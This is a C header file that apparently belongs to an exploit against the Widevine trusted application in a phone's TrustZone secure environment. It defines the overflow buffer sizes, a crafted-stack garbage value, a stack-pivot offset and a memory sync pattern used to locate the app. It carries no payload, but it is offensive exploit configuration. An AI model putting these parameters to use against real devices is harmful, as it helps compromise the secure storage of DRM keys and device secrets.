#ifndef __DEFS_H__
#define __DEFS_H__

/**
 * The size of the widevine message buffer allocated in PRDiagMaintenanceHandler
 */
#define TZ_MESSAGE_SIZE (0x3000)

/**
 * The amount of data copied from the overflowing buffer
 */
#define OVERFLOW_COPY_SIZE (0x1000)

/**
 * The path to the widevine application
 */
#define WIDEVINE_PATH ("/vendor/firmware")

/**
 * The name of the widevine application
 */
#define WIDEVINE_APP_NAME ("widevine")

/**
 * The size of the buffer used when loading the widevine application
 */
#define WIDEVINE_BUFFER_SIZE (0x15000)

/**
 * The garbage value used on the crafted stack.
 */
#define GARBAGE_VALUE (0xABABABAB)

/**
 * The offset in the crafted stack to which we pivot (in order to account for some stack growth).
 */
#define CRAFTED_STACK_OFFSET (0x2000)

/**
 * The sync pattern used to find the widevine app in the "secure apps" area.
 * The data is composed of couples (data, offset), where offset is the
 * offset from the start of the overflowing buffer (in DWORDs) to which
 * the data should be written.
 */
static const uint32_t g_sync_pattern[] = {0, 0,
										  1, 1,
										  0, 2,
										  1, 3,
										  0, 4,
										  1, 5,
										  0, 6,
										  1, 7};

#endif
